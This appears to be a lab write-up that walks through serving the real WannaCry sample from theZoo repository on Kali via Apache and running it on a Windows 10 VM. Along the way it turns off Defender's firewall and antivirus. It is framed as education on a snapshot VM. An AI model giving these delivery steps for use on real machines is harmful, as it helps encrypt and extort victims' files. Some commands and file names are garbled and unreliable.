<h1>Ransomware Attack on VMware using Kali Linus</h1>

<h2>Description</h2>
The project consists of a simple procedure of attacking a client using Ransomware. The specific malware deployed in this lab is WannaCry. Recall that Ransomware is an example of malware where the attacker’s request payment with a threat. The attacker can hide/encrypt all or part of the victim’s file system and request payment to get access back to the encrypted files. The attacker can threaten to release the victim’s data to the public if they don’t pay. 
<br />

<h2>NOTE</h2>
Users should understand the importance of Windows Defender and other Virus & Threat Protection Settings. This should not be turned off for whatever reason. The implication is that user education is very necessary in any organization because human error such as turning off these important settings might put the company at risk. 

<h2>WARNING</h2>
This is for educational purposes only and should not be used to attack unsuspecting victims. DO NOT run or open the ransomware file you create in this lab on your host computer. Use your Windows 10/11 virtual machine. Take a snapshot of your VM before you run the ransomware file. 


<h2>Languages and Utilities Used</h2>

- <b>Apache</b> 
- <b>Zoo</b>

<h2>Environments Used </h2>

- <b>Windows 10</b> (21H2)
- <b>Kali</b>
  
<h2>Program walk-through:</h2>

<p align="center">
1.	Connect Kali to NAT.In the Kali Linux, open a terminal and then type hostname -I to retrieve the IP address of the Linux
<br/>
<img src="https://imgur.com/vFnkFmK.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<br />
<br />
2. Run the following command to access the code in the repository: git clone https://github. com/ytisf/
theZoo.git
<br/>
<img src="https://imgur.com/tfK6agD.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<br />
<br />
3. Run the list command: ls <br/>
<img src="https://imgur.com/dSk8hSC.png" height="80%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />
4. Navigate into theZoo directory. Run cd theZooUse ls to see the contents of theZoo directory
<br/>
<img src="https://imgur.com/SHWmZ6K.png" height="80%" width="40%" alt="Disk Sanitization Steps"/>
<br />
<br />
5.	Run pip install --user -r require ments.txt. Wait for the installations to complete. <br/>
<img src="https://imgur.com/x9fcs3n.png" height="80%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />
6. Running python theZoo.py gives an error, so Run python 2 theZoo.py will be better. Type YES when prompted
<br/>
<img src="https://imgur.com/3NGLzPH.png" height="80%" width="80%" alt="Disk Sanitization Steps"/>
</p>
<p align="center">
7. After installation, type Update-db at the mdb prompt and list all to identify WannaCry.<br/> 
<img src="https://imgur.com/WITbzxH.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
8. Run the following commands: 
ls (To show the zipped ransomware file); 
cat Ransomware.WannaCry.Pass (Enter the password as; infected);
unzip Ransomware.WannaCry.zip (To unzip the file and then enter the password as; infected);
mv ...file name (To make it an executable file);
ls (To verify that the presence of the executable ransomware);
sudo mv MySweetHeart.exe /var/www/html;
sudo service apache2 start (Start Apache);
<br/>
<img src="https://imgur.com/x0x2aNf.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
9. You may need to turn off the Windows Defender Firewall settings for the ransomware attack to work
<img src="https://imgur.com/nCNE2af.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
10. Turn off the Virus & threat protections settings too
<img src="https://imgur.com/FKiuWhY.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
11. In windows client, open a browser and enter http://Kali-IP-Address/ransomware.exe. 
<img src="https://imgur.com/kZVgZO1.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
12. Select “run” when prompted. Select “yes” when prompted. The Ransomware is activated on the screen now! The windows client is under attack. 
<img src="https://imgur.com/xsFjrTb.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
13. The users files are encrypted and they attackers are now requesting a ransome. 
<img src="https://imgur.com/fwVX5zU.png" height="80%" width="60%" alt="Disk Sanitization Steps"/>
<p align="center">
  
<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
